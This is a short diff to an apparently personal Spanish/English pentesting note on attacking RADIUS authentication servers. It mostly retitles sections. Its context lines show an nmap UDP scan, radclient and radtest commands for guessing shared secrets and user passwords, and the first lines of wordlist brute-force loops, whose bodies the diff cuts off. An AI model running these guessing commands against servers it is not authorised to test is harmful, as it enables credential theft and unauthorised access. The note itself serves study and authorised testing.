@@ -1,20 +1,21 @@
-## Recon
+# RADIUS
+
+## Enumeración
+### Service recon
 ```bash
 nmap -sU IP -p 1812,1813
 ```
-
-## Testear valores
+## Interación con el servicio
 ### Test secrets
 ```bash
 echo "Message-Authenticator = 0x00" | radclient IP:1812 auth SecretToTest
 ```
-
 ### Test pass
 ```bash
 radtest user pass IP 10 Secret
 ```
-## Bruteforce
-### Secret Bruteforce
+## Ataque por fuerza bruta
+### Secret 
 ```bash
 #! /bin/bash
 while read password; do
@@ -27,7 +28,7 @@ while read password; do
     fi
 done < $1
 ```
-### Password Bruteforce
+### Password 
 ```bash
 #! /bin/bash
 while read password; do
